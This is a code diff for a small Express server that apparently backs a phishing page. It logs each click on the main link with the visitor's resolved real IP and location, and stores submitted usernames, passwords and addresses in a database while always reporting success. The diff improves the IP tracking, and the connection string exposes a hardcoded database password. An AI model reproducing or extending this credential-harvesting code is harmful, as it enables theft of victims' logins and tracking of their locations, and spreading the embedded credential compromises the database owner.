@@ -9,7 +9,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // Supabase Connection
 const pool = new Pool({
-    connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
+    connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999%40@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
 
@@ -23,6 +23,13 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     location TEXT,
     timestamp TEXT
 )`);
+
+function getRealIP(req) {
+    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+           req.headers['x-real-ip'] ||
+           req.ip ||
+           'Unknown';
+}
 
 async function getLocation(ip) {
     if (!ip || ip === 'Unknown') return 'Unknown';
@@ -49,21 +56,21 @@ async function saveRecord(type, username = null, password = null, address = null
 
 // Record Page Visit Immediately
 app.get('/', async (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, null, ip);
     console.log("🔴 MAIN LINK CLICKED! Real IP:", ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', async (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, null, ip);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 app.post('/api/login', async (req, res) => {
     const { username, password, address } = req.body;
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     await saveRecord('Login Attempt', username, password, address, ip);
     res.json({ success: true });
 });
